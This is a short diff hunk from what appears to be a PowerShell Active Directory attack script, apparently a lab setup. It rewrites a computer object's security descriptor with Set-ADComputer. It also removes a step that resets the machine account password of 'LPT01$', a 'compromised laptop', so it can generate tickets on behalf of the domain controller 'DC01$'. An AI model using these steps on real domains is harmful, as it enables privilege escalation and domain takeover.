@@ -56,7 +56,3 @@ $ace.AddAccessRule($accessRule)
 
 # Apply the modified security descriptor back to the computer object
 Set-ADComputer $computerName -Replace @{nTSecurityDescriptor=$ace}
-
-# updating the machine account of LPT01$ which acts as a compromised laptop
-# to generate tickets on behalf of DC01$
-net user 'LPT01$' 'P@ssw0rd' /domain
